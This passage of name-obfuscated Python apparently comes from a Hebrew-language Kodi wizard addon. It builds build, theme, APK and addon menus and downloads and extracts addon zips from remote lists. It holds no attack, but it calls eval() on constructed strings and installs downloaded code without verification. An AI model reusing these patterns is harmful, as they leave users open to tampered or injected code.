	for O0O0OO0OO0O0O0000 ,OOO000OOO0O0O00OO ,OO00O0000000O00OO ,OOOO0OO0OOO0OO00O ,O0000O0O0OO000OO0 ,O0000OOOO0OO00OOO ,OO000O0O0O00OO0O0 ,OOOO0OOO0OO00O00O ,O000OOO0O000OOOOO ,OOOOOO000OOOO00O0 in OOO000O00OO000OO0 :#line:2043
		O0000OOOO0OO00OOO =O0000OOOO0OO00OOO if wiz .workingURL (O0000OOOO0OO00OOO )else ICON #line:2044
		OO000O0O0O00OO0O0 =OO000O0O0O00OO0O0 if wiz .workingURL (OO000O0O0O00OO0O0 )else FANART #line:2045
		O0OO0OO00OO00OOO0 ='%s (v%s)'%(O000O0O00O0O0O00O ,O0O0OO0OO0O0O0000 )#line:2046
		if BUILDNAME ==O000O0O00O0O0O00O and O0O0OO0OO0O0O0000 >BUILDVERSION :#line:2047
			O0OO0OO00OO00OOO0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OO0OO00OO00OOO0 ,BUILDVERSION )#line:2048
		O00O0OO00O0O0OO00 =int (float (KODIV ));OOO0OO0O0O00O0000 =int (float (OOOO0OO0OOO0OO00O ))#line:2057
		if not O00O0OO00O0O0OO00 ==OOO0OO0O0O00O0000 :#line:2058
			if O00O0OO00O0O0OO00 ==16 and OOO0OO0O0O00O0000 <=15 :O00O000O0000O000O =False #line:2059
			else :O00O000O0000O000O =True #line:2060
		else :O00O000O0000O000O =False #line:2061
		addFile ('התקנה','install',O000O0O00O0O0O00O ,'fresh',description =OOOOOO000OOOO00O0 ,fanart =OO000O0O0O00OO0O0 ,icon =O0000OOOO0OO00OOO ,themeit =THEME1 )#line:2065
		if not O0000O0O0OO000OO0 =='http://':#line:2068
			if wiz .workingURL (O0000O0O0OO000OO0 )==True :#line:2069
				addFile (wiz .sep ('THEMES'),'',fanart =OO000O0O0O00OO0O0 ,icon =O0000OOOO0OO00OOO ,themeit =THEME3 )#line:2070
				O0OO0O0O000O0O0OO =wiz .openURL (O0000O0O0OO000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2071
				OOO000O00OO000OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O0O000O0O0OO )#line:2072
				for OOO000O0OO0OO0O0O ,O000OOO0O0OO0O0OO ,O0O0O0O0O0O0O00O0 ,OOOO0O00OO0O0O0O0 ,O00O000OOOOO0000O ,OOOOOO000OOOO00O0 in OOO000O00OO000OO0 :#line:2073
					if not SHOWADULT =='true'and O00O000OOOOO0000O .lower ()=='yes':continue #line:2074
					O0O0O0O0O0O0O00O0 =O0O0O0O0O0O0O00O0 if O0O0O0O0O0O0O00O0 =='http://'else O0000OOOO0OO00OOO #line:2075
					OOOO0O00OO0O0O0O0 =OOOO0O00OO0O0O0O0 if OOOO0O00OO0O0O0O0 =='http://'else OO000O0O0O00OO0O0 #line:2076
					addFile (OOO000O0OO0OO0O0O if not OOO000O0OO0OO0O0O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO000O0OO0OO0O0O ,'theme',O000O0O00O0O0O00O ,OOO000O0OO0OO0O0O ,description =OOOOOO000OOOO00O0 ,fanart =OOOO0O00OO0O0O0O0 ,icon =O0O0O0O0O0O0O00O0 ,themeit =THEME3 )#line:2077
	setView ('files','viewType')#line:2078
def viewThirdList (OO0OOO00000O0OOO0 ):#line:2080
	O000OOOOO0OO00OO0 =eval ('THIRD%sNAME'%OO0OOO00000O0OOO0 )#line:2081
	OO00OO00O0O00OO00 =eval ('THIRD%sURL'%OO0OOO00000O0OOO0 )#line:2082
	OO000OOOO0000OO0O =wiz .workingURL (OO00OO00O0O00OO00 )#line:2083
	if not OO000OOOO0000OO0O ==True :#line:2084
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2085
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2086
	else :#line:2087
		OOO00OO0OO00O000O ,OOO00OO0OOOO00O0O =wiz .thirdParty (OO00OO00O0O00OO00 )#line:2088
		addFile ("[B]%s[/B]"%O000OOOOO0OO00OO0 ,'',themeit =THEME3 )#line:2089
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2090
		if OOO00OO0OO00O000O :#line:2091
			for O000OOOOO0OO00OO0 ,O0O0OO0OOOOO0O00O ,OO00OO00O0O00OO00 ,OO0OOOO0O0OO0O000 ,OO0OO0O00OO00OOO0 ,OO00OOO00O000OO00 ,O0000OO00O00O0000 ,O0OOO0OO00O0O0OOO in OOO00OO0OOOO00O0O :#line:2092
				if not SHOWADULT =='true'and O0000OO00O00O0000 .lower ()=='yes':continue #line:2093
				addFile ("[%s] %s v%s"%(OO0OOOO0O0OO0O000 ,O000OOOOO0OO00OO0 ,O0O0OO0OOOOO0O00O ),'installthird',O000OOOOO0OO00OO0 ,OO00OO00O0O00OO00 ,icon =OO0OO0O00OO00OOO0 ,fanart =OO00OOO00O000OO00 ,description =O0OOO0OO00O0O0OOO ,themeit =THEME2 )#line:2094
		else :#line:2095
			for O000OOOOO0OO00OO0 ,OO00OO00O0O00OO00 ,OO0OO0O00OO00OOO0 ,OO00OOO00O000OO00 ,O0OOO0OO00O0O0OOO in OOO00OO0OOOO00O0O :#line:2096
				addFile (O000OOOOO0OO00OO0 ,'installthird',O000OOOOO0OO00OO0 ,OO00OO00O0O00OO00 ,icon =OO0OO0O00OO00OOO0 ,fanart =OO00OOO00O000OO00 ,description =O0OOO0OO00O0O0OOO ,themeit =THEME2 )#line:2097
def editThirdParty (OO0OOOO00000OOOOO ):#line:2099
	OO0000O00O00OOO00 =eval ('THIRD%sNAME'%OO0OOOO00000OOOOO )#line:2100
	OO000O00O0O00OO00 =eval ('THIRD%sURL'%OO0OOOO00000OOOOO )#line:2101
	OOOOOO0000OOO00OO =wiz .getKeyboard (OO0000O00O00OOO00 ,'Enter the Name of the Wizard')#line:2102
	OO0000O00OOOOO00O =wiz .getKeyboard (OO000O00O0O00OO00 ,'Enter the URL of the Wizard Text')#line:2103
	wiz .setS ('wizard%sname'%OO0OOOO00000OOOOO ,OOOOOO0000OOO00OO )#line:2105
	wiz .setS ('wizard%surl'%OO0OOOO00000OOOOO ,OO0000O00OOOOO00O )#line:2106
def apkScraper (name =""):#line:2108
	if name =='kodi':#line:2109
		OOOO0OOOOOOO00O0O ='http://mirrors.kodi.tv/releases/android/arm/'#line:2110
		O00000O0OOOOO0OOO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2111
		O0O0000O000000O0O =wiz .openURL (OOOO0OOOOOOO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2112
		O000O00O0O00O0O0O =wiz .openURL (O00000O0OOOOO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2113
		OOO0O0O00O00OO0OO =0 #line:2114
		OO0OO0O000O0O0OOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0000O000000O0O )#line:2115
		O0000000OO00000O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000O00O0O00O0O0O )#line:2116
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2118
		OOO0O0OOO0O0O0OOO =False #line:2119
		for OOO0O0000OO0OO00O ,name ,OOOOO0OOO0OOO0000 ,OO0OOOOO0O0000O0O in OO0OO0O000O0O0OOO :#line:2120
			if OOO0O0000OO0OO00O in ['../','old/']:continue #line:2121
			if not OOO0O0000OO0OO00O .endswith ('.apk'):continue #line:2122
			if not OOO0O0000OO0OO00O .find ('_')==-1 and OOO0O0OOO0O0O0OOO ==True :continue #line:2123
			try :#line:2124
				O00000OO00O00O000 =name .split ('-')#line:2125
				if not OOO0O0000OO0OO00O .find ('_')==-1 :#line:2126
					OOO0O0OOO0O0O0OOO =True #line:2127
					O000OOOOOOOOO0O00 ,OO0O0000O000O000O =O00000OO00O00O000 [2 ].split ('_')#line:2128
				else :#line:2129
					O000OOOOOOOOO0O00 =O00000OO00O00O000 [2 ]#line:2130
					OO0O0000O000O000O =''#line:2131
				O000O00000OOO0OOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OO00O00O000 [0 ].title (),O00000OO00O00O000 [1 ],OO0O0000O000O000O .upper (),O000OOOOOOOOO0O00 ,COLOR2 ,OOOOO0OOO0OOO0000 .replace (' ',''),COLOR1 ,OO0OOOOO0O0000O0O )#line:2132
				O0O00000000OO0O00 =urljoin (OOOO0OOOOOOO00O0O ,OOO0O0000OO0OO00O )#line:2133
				addFile (O000O00000OOO0OOO ,'apkinstall',"%s v%s%s %s"%(O00000OO00O00O000 [0 ].title (),O00000OO00O00O000 [1 ],OO0O0000O000O000O .upper (),O000OOOOOOOOO0O00 ),O0O00000000OO0O00 )#line:2134
				OOO0O0O00O00OO0OO +=1 #line:2135
			except :#line:2136
				wiz .log ("Error on: %s"%name )#line:2137
		for OOO0O0000OO0OO00O ,name ,OOOOO0OOO0OOO0000 ,OO0OOOOO0O0000O0O in O0000000OO00000O0 :#line:2139
			if OOO0O0000OO0OO00O in ['../','old/']:continue #line:2140
			if not OOO0O0000OO0OO00O .endswith ('.apk'):continue #line:2141
			if not OOO0O0000OO0OO00O .find ('_')==-1 :continue #line:2142
			try :#line:2143
				O00000OO00O00O000 =name .split ('-')#line:2144
				O000O00000OOO0OOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OO00O00O000 [0 ].title (),O00000OO00O00O000 [1 ],O00000OO00O00O000 [2 ],COLOR2 ,OOOOO0OOO0OOO0000 .replace (' ',''),COLOR1 ,OO0OOOOO0O0000O0O )#line:2145
				O0O00000000OO0O00 =urljoin (O00000O0OOOOO0OOO ,OOO0O0000OO0OO00O )#line:2146
				addFile (O000O00000OOO0OOO ,'apkinstall',"%s v%s %s"%(O00000OO00O00O000 [0 ].title (),O00000OO00O00O000 [1 ],O00000OO00O00O000 [2 ]),O0O00000000OO0O00 )#line:2147
				OOO0O0O00O00OO0OO +=1 #line:2148
			except :#line:2149
				wiz .log ("Error on: %s"%name )#line:2150
		if OOO0O0O00O00OO0OO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2151
	elif name =='spmc':#line:2152
		O0OOO0OO0OO00O0O0 ='https://github.com/koying/SPMC/releases'#line:2153
		O0O0000O000000O0O =wiz .openURL (O0OOO0OO0OO00O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2154
		OOO0O0O00O00OO0OO =0 #line:2155
		OO0OO0O000O0O0OOO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0O0000O000000O0O )#line:2156
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2158
		for name ,O00000O00000OOOO0 in OO0OO0O000O0O0OOO :#line:2160
			OOOO00000OOOOOOO0 =''#line:2161
			O0000000OO00000O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00000O00000OOOO0 )#line:2162
			for OOOO0OOOO000O0000 ,O00000OOOO0OOO0O0 ,OO000000OO0O00OO0 in O0000000OO00000O0 :#line:2163
				if OO000000OO0O00OO0 .find ('armeabi')==-1 :continue #line:2164
				if OO000000OO0O00OO0 .find ('launcher')>-1 :continue #line:2165
				OOOO00000OOOOOOO0 =urljoin ('https://github.com',OOOO0OOOO000O0000 )#line:2166
				break #line:2167
		if OOO0O0O00O00OO0OO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2169
def apkMenu (url =None ):#line:2171
	if url ==None :#line:2172
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2175
	if not APKFILE =='http://':#line:2176
		if url ==None :#line:2177
			O0O00OO00O0O0O00O =wiz .workingURL (APKFILE )#line:2178
			O00O00O00OO0000OO =uservar .APKFILE #line:2179
		else :#line:2180
			O0O00OO00O0O0O00O =wiz .workingURL (url )#line:2181
			O00O00O00OO0000OO =url #line:2182
		if O0O00OO00O0O0O00O ==True :#line:2183
			O000OO000OOOO0000 =wiz .openURL (O00O00O00OO0000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2184
			O0OO000O00O0O00O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OO000OOOO0000 )#line:2185
			if len (O0OO000O00O0O00O0 )>0 :#line:2186
				OOOO0O00O0OOO000O =0 #line:2187
				for OO0OO00O00OOOOOO0 ,OO0000OO000OOO000 ,url ,OO0OO0OO0OO0OO0OO ,O00OO00OOO0000000 ,OO0OOOOOO00OOOOO0 ,OOOO000O000O00O00 in O0OO000O00O0O00O0 :#line:2188
					if not SHOWADULT =='true'and OO0OOOOOO00OOOOO0 .lower ()=='yes':continue #line:2189
					if OO0000OO000OOO000 .lower ()=='yes':#line:2190
						OOOO0O00O0OOO000O +=1 #line:2191
						addDir ("[B]%s[/B]"%OO0OO00O00OOOOOO0 ,'apk',url ,description =OOOO000O000O00O00 ,icon =OO0OO0OO0OO0OO0OO ,fanart =O00OO00OOO0000000 ,themeit =THEME3 )#line:2192
					else :#line:2193
						OOOO0O00O0OOO000O +=1 #line:2194
						addFile (OO0OO00O00OOOOOO0 ,'apkinstall',OO0OO00O00OOOOOO0 ,url ,description =OOOO000O000O00O00 ,icon =OO0OO0OO0OO0OO0OO ,fanart =O00OO00OOO0000000 ,themeit =THEME2 )#line:2195
					if OOOO0O00O0OOO000O <1 :#line:2196
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2197
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2198
		else :#line:2199
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2200
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2201
			addFile ('%s'%O0O00OO00O0O0O00O ,'',themeit =THEME3 )#line:2202
		return #line:2203
	else :wiz .log ("[APK Menu] No APK list added.")#line:2204
	setView ('files','viewType')#line:2205
def addonMenu (url =None ):#line:2207
	if not ADDONFILE =='http://':#line:2208
		if url ==None :#line:2209
			OOOO0O0OOO0000OOO =wiz .workingURL (ADDONFILE )#line:2210
			O0O00OO00OOOOOOO0 =uservar .ADDONFILE #line:2211
		else :#line:2212
			OOOO0O0OOO0000OOO =wiz .workingURL (url )#line:2213
			O0O00OO00OOOOOOO0 =url #line:2214
		if OOOO0O0OOO0000OOO ==True :#line:2215
			O00000000OO0000O0 =wiz .openURL (O0O00OO00OOOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2216
			O0O00OOO0O000OO0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00000000OO0000O0 )#line:2217
			if len (O0O00OOO0O000OO0O )>0 :#line:2218
				OO0OO00OOOO00OO00 =0 #line:2219
				for O0OOOOO00OO0OOOO0 ,OO0OOO0O00OO00000 ,url ,O00O00OO0OO0OOO0O ,O0OOO0OOOOOO0O0O0 ,OOO0O000OO0O000O0 ,OOO0OOO0000OO00O0 ,O0O00000OO0000OO0 ,OOO00O000O00O0O0O ,O000000OO00OOOO0O in O0O00OOO0O000OO0O :#line:2220
					if OO0OOO0O00OO00000 .lower ()=='section':#line:2221
						OO0OO00OOOO00OO00 +=1 #line:2222
						addDir ("[B]%s[/B]"%O0OOOOO00OO0OOOO0 ,'addons',url ,description =O000000OO00OOOO0O ,icon =OOO0OOO0000OO00O0 ,fanart =O0O00000OO0000OO0 ,themeit =THEME3 )#line:2223
					else :#line:2224
						if not SHOWADULT =='true'and OOO00O000O00O0O0O .lower ()=='yes':continue #line:2225
						try :#line:2226
							O000OOO0O00OOOOO0 =xbmcaddon .Addon (id =OO0OOO0O00OO00000 ).getAddonInfo ('path')#line:2227
							if os .path .exists (O000OOO0O00OOOOO0 ):#line:2228
								O0OOOOO00OO0OOOO0 ="[COLOR green][Installed][/COLOR] %s"%O0OOOOO00OO0OOOO0 #line:2229
						except :#line:2230
							pass #line:2231
						OO0OO00OOOO00OO00 +=1 #line:2232
						addFile (O0OOOOO00OO0OOOO0 ,'addoninstall',OO0OOO0O00OO00000 ,O0O00OO00OOOOOOO0 ,description =O000000OO00OOOO0O ,icon =OOO0OOO0000OO00O0 ,fanart =O0O00000OO0000OO0 ,themeit =THEME2 )#line:2233
					if OO0OO00OOOO00OO00 <1 :#line:2234
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2235
			else :#line:2236
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2237
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2238
		else :#line:2239
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2240
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2241
			addFile ('%s'%OOOO0O0OOO0000OOO ,'',themeit =THEME3 )#line:2242
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2243
	setView ('files','viewType')#line:2244
def addonInstaller (OO000O000O00OOOOO ,O000OO00O0OOOO00O ):#line:2246
	if not ADDONFILE =='http://':#line:2247
		OO000O0O00O000OO0 =wiz .workingURL (O000OO00O0OOOO00O )#line:2248
		if OO000O0O00O000OO0 ==True :#line:2249
			OOOO0000O0OO0OO00 =wiz .openURL (O000OO00O0OOOO00O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2250
			O0O000O0OOO00OOOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO000O000O00OOOOO ).findall (OOOO0000O0OO0OO00 )#line:2251
			if len (O0O000O0OOO00OOOO )>0 :#line:2252
				for O000O00OOO00OOO0O ,O000OO00O0OOOO00O ,OOOO00O0O0O0OOO0O ,OO000O000OO0OOO0O ,O0OOOOOO0O00OO0OO ,O0OOO0OO0OO0000O0 ,OO0OO00O0OO0O0OO0 ,OO0O0OOOOO0O00O00 ,O000000O00000OO00 in O0O000O0OOO00OOOO :#line:2253
					if os .path .exists (os .path .join (ADDONS ,OO000O000O00OOOOO )):#line:2254
						O0OO0O0000OOO0000 =['Launch Addon','Remove Addon']#line:2255
						OOOOO0OO0OO0000O0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OO0O0000OOO0000 )#line:2256
						if OOOOO0OO0OO0000O0 ==0 :#line:2257
							wiz .ebi ('RunAddon(%s)'%OO000O000O00OOOOO )#line:2258
							xbmc .sleep (1000 )#line:2259
							return True #line:2260
						elif OOOOO0OO0OO0000O0 ==1 :#line:2261
							wiz .cleanHouse (os .path .join (ADDONS ,OO000O000O00OOOOO ))#line:2262
							try :wiz .removeFolder (os .path .join (ADDONS ,OO000O000O00OOOOO ))#line:2263
							except :pass #line:2264
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO000O000O00OOOOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2265
								removeAddonData (OO000O000O00OOOOO )#line:2266
							wiz .refresh ()#line:2267
							return True #line:2268
						else :#line:2269
							return False #line:2270
					O0OO0OOOO0O00O0O0 =os .path .join (ADDONS ,OOOO00O0O0O0OOO0O )#line:2271
					if not OOOO00O0O0O0OOO0O .lower ()=='none'and not os .path .exists (O0OO0OOOO0O00O0O0 ):#line:2272
						wiz .log ("Repository not installed, installing it")#line:2273
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO000O000O00OOOOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO00O0O0O0OOO0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2274
							O00O0OO0O00000OOO =wiz .parseDOM (wiz .openURL (OO000O000OO0OOO0O ),'addon',ret ='version',attrs ={'id':OOOO00O0O0O0OOO0O })#line:2275
							if len (O00O0OO0O00000OOO )>0 :#line:2276
								O00000O000O0O0O00 ='%s%s-%s.zip'%(O0OOOOOO0O00OO0OO ,OOOO00O0O0O0OOO0O ,O00O0OO0O00000OOO [0 ])#line:2277
								wiz .log (O00000O000O0O0O00 )#line:2278
								if KODIV >=17 :wiz .addonDatabase (OOOO00O0O0O0OOO0O ,1 )#line:2279
								installAddon (OOOO00O0O0O0OOO0O ,O00000O000O0O0O00 )#line:2280
								wiz .ebi ('UpdateAddonRepos()')#line:2281
								wiz .log ("Installing Addon from Kodi")#line:2283
								OO0OO000O00OOOO0O =installFromKodi (OO000O000O00OOOOO )#line:2284
								wiz .log ("Install from Kodi: %s"%OO0OO000O00OOOO0O )#line:2285
								if OO0OO000O00OOOO0O :#line:2286
									wiz .refresh ()#line:2287
									return True #line:2288
							else :#line:2289
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOO00O0O0O0OOO0O )#line:2290
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO000O000O00OOOOO ,OOOO00O0O0O0OOO0O ))#line:2291
					elif OOOO00O0O0O0OOO0O .lower ()=='none':#line:2292
						wiz .log ("No repository, installing addon")#line:2293
						OO0O0OOOO000O000O =OO000O000O00OOOOO #line:2294
						OOO0000OO000O00O0 =O000OO00O0OOOO00O #line:2295
						installAddon (OO000O000O00OOOOO ,O000OO00O0OOOO00O )#line:2296
						wiz .refresh ()#line:2297
						return True #line:2298
					else :#line:2299
						wiz .log ("Repository installed, installing addon")#line:2300
						OO0OO000O00OOOO0O =installFromKodi (OO000O000O00OOOOO ,False )#line:2301
						if OO0OO000O00OOOO0O :#line:2302
							wiz .refresh ()#line:2303
							return True #line:2304
					if os .path .exists (os .path .join (ADDONS ,OO000O000O00OOOOO )):return True #line:2305
					OOOOO0O0O00O0O0OO =wiz .parseDOM (wiz .openURL (OO000O000OO0OOO0O ),'addon',ret ='version',attrs ={'id':OO000O000O00OOOOO })#line:2306
					if len (OOOOO0O0O00O0O0OO )>0 :#line:2307
						O000OO00O0OOOO00O ="%s%s-%s.zip"%(O000OO00O0OOOO00O ,OO000O000O00OOOOO ,OOOOO0O0O00O0O0OO [0 ])#line:2308
						wiz .log (str (O000OO00O0OOOO00O ))#line:2309
						if KODIV >=17 :wiz .addonDatabase (OO000O000O00OOOOO ,1 )#line:2310
						installAddon (OO000O000O00OOOOO ,O000OO00O0OOOO00O )#line:2311
						wiz .refresh ()#line:2312
					else :#line:2313
						wiz .log ("no match");return False #line:2314
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2315
		else :wiz .log ("[Addon Installer] Text File: %s"%OO000O0O00O000OO0 )#line:2316
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2317
def installFromKodi (O000O000OOO00OOO0 ,over =True ):#line:2319
	if over ==True :#line:2320
		xbmc .sleep (2000 )#line:2321
	wiz .ebi ('RunPlugin(plugin://%s)'%O000O000OOO00OOO0 )#line:2323
	if not wiz .whileWindow ('yesnodialog'):#line:2324
		return False #line:2325
	xbmc .sleep (1000 )#line:2326
	if wiz .whileWindow ('okdialog'):#line:2327
		return False #line:2328
	wiz .whileWindow ('progressdialog')#line:2329
	if os .path .exists (os .path .join (ADDONS ,O000O000OOO00OOO0 )):return True #line:2330
	else :return False #line:2331
def installAddon (OO000O0000O0OO0OO ,O0O0OOO0000000000 ):#line:2333
	if not wiz .workingURL (O0O0OOO0000000000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO000O0000O0OO0OO ,COLOR2 ));return #line:2334
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2335
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O0000O0OO0OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2336
	O00O0OOOO0O0OOOO0 =O0O0OOO0000000000 .split ('/')#line:2337
	O0O0O00OOOO0O0OO0 =os .path .join (PACKAGES ,O00O0OOOO0O0OOOO0 [-1 ])#line:2338
	try :os .remove (O0O0O00OOOO0O0OO0 )#line:2339
	except :pass #line:2340
	downloader .download (O0O0OOO0000000000 ,O0O0O00OOOO0O0OO0 ,DP )#line:2341
	OO0O0O0OOO0O00000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O0000O0OO0OO )#line:2342
	DP .update (0 ,OO0O0O0OOO0O00000 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2343
	OO0000OOO0OO0OO00 ,OOO000O0O0000O0O0 ,OOOOOO0O0OOO00O00 =extract .all (O0O0O00OOOO0O0OO0 ,ADDONS ,DP ,title =OO0O0O0OOO0O00000 )#line:2344
	DP .update (0 ,OO0O0O0OOO0O00000 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2345
	installed (OO000O0000O0OO0OO )#line:2346
	installDep (OO000O0000O0OO0OO ,DP )#line:2347
	DP .close ()#line:2348
	wiz .ebi ('UpdateAddonRepos()')#line:2349
	wiz .ebi ('UpdateLocalAddons()')#line:2350
	wiz .refresh ()#line:2351
def installDep (OO00OOOO000O00O00 ,DP =None ):#line:2353
	OOO0OOO00O0O000OO =os .path .join (ADDONS ,OO00OOOO000O00O00 ,'addon.xml')#line:2354
	if os .path .exists (OOO0OOO00O0O000OO ):#line:2355
		OOO0OOOO0OO00O0OO =open (OOO0OOO00O0O000OO ,mode ='r');OO00O0OOOO00O0OOO =OOO0OOOO0OO00O0OO .read ();OOO0OOOO0OO00O0OO .close ();#line:2356
		OOO0OO000OOOO0OO0 =wiz .parseDOM (OO00O0OOOO00O0OOO ,'import',ret ='addon')#line:2357
		for OOOO0000OO000OO00 in OOO0OO000OOOO0OO0 :#line:2358
			if not 'xbmc.python'in OOOO0000OO000OO00 :#line:2359
				if not DP ==None :#line:2360
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0000OO000OO00 ))#line:2361
				wiz .createTemp (OOOO0000OO000OO00 )#line:2362
def installed (O0000OO00O000OO00 ):#line:2389
	OO000OOOO0O00OO0O =os .path .join (ADDONS ,O0000OO00O000OO00 ,'addon.xml')#line:2390
	if os .path .exists (OO000OOOO0O00OO0O ):#line:2391
		try :#line:2392
			O0OOOO0O0O00O00O0 =open (OO000OOOO0O00OO0O ,mode ='r');O000OOOOOOOOOO00O =O0OOOO0O0O00O00O0 .read ();O0OOOO0O0O00O00O0 .close ()#line:2393
			O00000OOO000OOO00 =wiz .parseDOM (O000OOOOOOOOOO00O ,'addon',ret ='name',attrs ={'id':O0000OO00O000OO00 })#line:2394
			O0O00O0OO000O0OO0 =os .path .join (ADDONS ,O0000OO00O000OO00 ,'icon.png')#line:2395
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00000OOO000OOO00 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0O00O0OO000O0OO0 )#line:2396
		except :pass #line:2397
def youtubeMenu (url =None ):#line:2399
	if not YOUTUBEFILE =='http://':#line:2400
		if url ==None :#line:2401
			O00O0OOO00O00OO00 =wiz .workingURL (YOUTUBEFILE )#line:2402
			O000O0OO000O00OOO =uservar .YOUTUBEFILE #line:2403
		else :#line:2404
			O00O0OOO00O00OO00 =wiz .workingURL (url )#line:2405
			O000O0OO000O00OOO =url #line:2406
		if O00O0OOO00O00OO00 ==True :#line:2407
			O0O0OO0O0O0O0OO00 =wiz .openURL (O000O0OO000O00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2408
			OOO0OO0O0O0OOOO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OO0O0O0O0OO00 )#line:2409
			if len (OOO0OO0O0O0OOOO0O )>0 :#line:2410
				for O0OO0OOOOO0OO000O ,OOO0O0OO00O00OO00 ,url ,O00OO00OO0000OOOO ,O0OO0OOOOOO000O00 ,OO0OOO00O0OOOOOOO in OOO0OO0O0O0OOOO0O :#line:2411
					if OOO0O0OO00O00OO00 .lower ()=="yes":#line:2412
